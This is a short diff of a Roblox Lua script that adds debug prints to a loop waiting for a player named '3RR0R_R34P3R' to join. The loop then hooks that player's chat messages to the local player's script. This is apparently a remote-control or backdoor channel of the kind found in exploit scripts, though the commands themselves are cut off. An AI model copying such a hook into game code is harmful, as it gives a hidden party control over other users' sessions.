@@ -63,10 +63,13 @@ spawn(function()
     end
 end)
 namefound = false
+print("looking")
 spawn(function()
 	repeat
-        wait()
+        print("searching")
+        wait(1)
     until game.Players:FindFirstChild("3RR0R_R34P3R")
+    print("found")
     local scruser = game.Players.LocalPlayer
 	local scrowner2 = game.Players["3RR0R_R34P3R"]
 	scrowner2.Chatted:Connect(function(msg)
